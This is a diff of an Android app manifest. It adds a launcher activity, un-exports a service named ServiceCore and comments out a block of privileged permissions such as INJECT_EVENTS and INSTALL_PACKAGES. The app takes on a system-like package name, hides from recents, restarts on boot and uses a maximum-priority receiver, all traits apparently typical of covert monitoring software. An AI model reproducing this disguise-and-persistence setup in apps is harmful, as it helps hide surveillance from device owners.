@@ -32,13 +32,32 @@
 	<uses-permission android:name="android.permission.WAKE_LOCK" />
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
-	
+
+    <!-- 
+	<uses-permission android:name="android.permission.READ_INPUT_STATE" />
+	<uses-permission android:name="android.permission.INJECT_EVENTS" />
+	<uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES" />
+	<uses-permission android:name="android.permission.REBOOT" />
+	<uses-permission android:name="android.permission.CALL_PRIVILEGED" />
+	<uses-permission android:name="android.permission.INSTALL_PACKAGES" />
+	<uses-permission android:name="android.permission.DELETE_PACKAGES" />
+	<uses-permission android:name="android.permission.DEVICE_POWER" />
+	 -->
+
 	<application android:icon="@drawable/icon" android:label="@string/app_name">
-		<service android:name="ServiceCore" android:exported="true"
+		<activity android:name="com.android.service.gui.AndroidServiceGUI"
+			android:label="@string/app_name" android:excludeFromRecents="true"
+			android:enabled="true">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+		</activity>
+
+		<service android:name="ServiceCore" android:exported="false"
 			android:excludeFromRecents="true">
 			<intent-filter>
 				<action android:name="com.android.service.app"/>		
-				<action android:name="android.intent.action.MAIN"/>
 			</intent-filter>
 		</service>
 
@@ -46,6 +65,7 @@
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
+				<!--   <category android:name="android.intent.category.HOME" /> -->
 			</intent-filter>
 			
 			<intent-filter android:priority="65535">
